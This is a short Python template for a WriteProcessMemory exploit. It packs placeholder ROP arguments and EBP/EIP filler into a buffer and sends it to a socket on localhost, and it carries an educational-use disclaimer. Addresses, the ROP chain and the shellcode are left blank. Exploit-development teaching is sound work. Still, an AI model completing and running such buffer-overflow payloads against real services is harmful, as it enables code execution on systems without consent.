"""
Skeleton for WPM exploit.

WARNING: This script is for educational and testing purposes only. Running this script against non-consenting servers is illegal and unethical.

Social Media Links:
- Twitter: https://twitter.com/7etsuo
- GitHub: https://github.com/7etsuo
- YouTube: https://www.youtube.com/@snowcrash

Author: 7etsuo, 2024
"""

import socket
import struct

# BOOL WriteProcessMemory (
#    HANDLE  hProcess,
#    LPVOID  lpBaseAddress,
#    LPCVOID lpBuffer,
#    SIZE_T  nSize,
#    SIZE_T  *lpNumberOfBytesWritten
# );

skeleton =  struct.pack("<L", 0x41414141) # WriteProcessMemory address
skeleton += struct.pack("<L", 0x42424242) # shellcode return address to return to after WPM is called (Code Cave Address)
skeleton += struct.pack("<L", 0x43434343) # hProcess (pseduo process handle)
skeleton += struct.pack("<L", 0x42424242) # lpBaseAddress (Code cave Address)
skeleton += struct.pack("<L", 0x44444444) # lpBuffer (stack address of shellcode)
skeleton += struct.pack("<L", 0x45454545) # nSize (size of shellcode)
skeleton += struct.pack("<L", 0x46464646) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a Module) 

ebp = b'B'*4
eip = b'C'*4
rop = b""

buf = skeleton + ebp + eip + rop

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 12345))
s.sendall(buf)
s.close()
